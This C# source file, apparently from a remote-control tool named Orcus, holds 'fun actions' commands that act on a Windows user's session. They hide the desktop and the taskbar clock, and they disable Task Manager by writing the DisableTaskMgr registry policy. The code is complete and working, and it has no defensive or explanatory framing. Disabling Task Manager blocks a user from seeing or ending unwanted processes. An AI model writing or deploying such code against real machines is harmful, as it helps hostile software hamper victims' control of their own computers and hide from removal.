using Microsoft.Win32;
using Orcus.Native;
using Orcus.Utilities;

namespace Orcus.Commands.FunActions
{
    internal static class WindowsModules
    {
        public static void SetDesktopVisibility(bool visible)
        {
            var hWnd = WindowHelper.GetDesktopWindow(DesktopWindow.ProgMan);
            NativeMethods.ShowWindow(hWnd, visible ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
        }

        public static void SetClockVisibility(bool visible)
        {
            var hWnd = NativeMethods.GetDlgItem(NativeMethods.FindWindow("Shell_TrayWnd", null), 0x12F);
            hWnd = NativeMethods.GetDlgItem(hWnd, 0x12F);
            NativeMethods.ShowWindow(hWnd, visible ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
        }

        public static void SetTaskManager(bool enable)
        {
            using (var objRegistryKey =
                Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (enable && objRegistryKey?.GetValue("DisableTaskMgr") != null)
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                else
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
            }
        }
    }
}